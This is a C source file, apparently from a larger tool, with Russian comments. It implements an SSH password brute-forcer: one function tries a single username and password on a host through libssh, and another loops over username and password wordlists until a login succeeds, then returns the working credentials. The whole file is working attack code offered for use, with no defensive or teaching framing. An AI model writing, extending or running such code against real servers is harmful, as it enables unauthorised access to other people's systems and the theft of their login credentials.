#include "include/includes.h"

typedef struct {
    char username[128];
    char password[128];
    int good;
} Credentials;

int try_login(const char *host, const char *user, const char *password) {
    ssh_session session = ssh_new();
    if (session == NULL) {
        fprintf(stderr, "Error: Unable to create SSH session\n");
        return -1;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_USER, user);

    printf("Connecting to %s as %s...\n", host, user);
    if (ssh_connect(session) != SSH_OK) {
        fprintf(stderr, "Error: %s\n", ssh_get_error(session));
        ssh_free(session);
        return -1;
    }

    printf("Trying password: %s\n", password);
    int rc = ssh_userauth_password(session, NULL, password);
    if (rc == SSH_AUTH_SUCCESS) {
        printf("Password found: %s\n", password);
        ssh_disconnect(session); // Разрываем соединение при успешном входе
        ssh_free(session);
        return 0; // Успех
    } else {
        printf("Failed password: %s\n", password);
        ssh_disconnect(session); // Разрываем соединение при неудаче
        ssh_free(session);
        return -1; // Неудача
    }
}

Credentials ssh_brute(char *host) {
    Credentials credentials = { .username = "", .password = "", .good = 0 }; // Инициализация пустыми строками
    int shutup_ssh_bruteforce = 0;

    for (int b = 0; usernames[b] != NULL; b++) {
        for (int i = 0; passwords[i] != NULL; i++) {
            if (try_login(host, usernames[b], passwords[i]) == 0) {
                // Если пароль найден, сохраняем учетные данные
                strncpy(credentials.username, usernames[b], sizeof(credentials.username) - 1);
                strncpy(credentials.password, passwords[i], sizeof(credentials.password) - 1);
                credentials.username[sizeof(credentials.username) - 1] = '\0'; // Обеспечиваем нуль-терминацию
                credentials.password[sizeof(credentials.password) - 1] = '\0'; // Обеспечиваем нуль-терминацию
                credentials.good = 1;
                shutup_ssh_bruteforce = 20;
                break; // Если пароль найден, выходим из цикла
            }
        }

        if (shutup_ssh_bruteforce == 20) {
            break; // Выходим из внешнего цикла, если пароль найден
        }
    }

    return credentials; // Возвращаем найденные учетные данные
}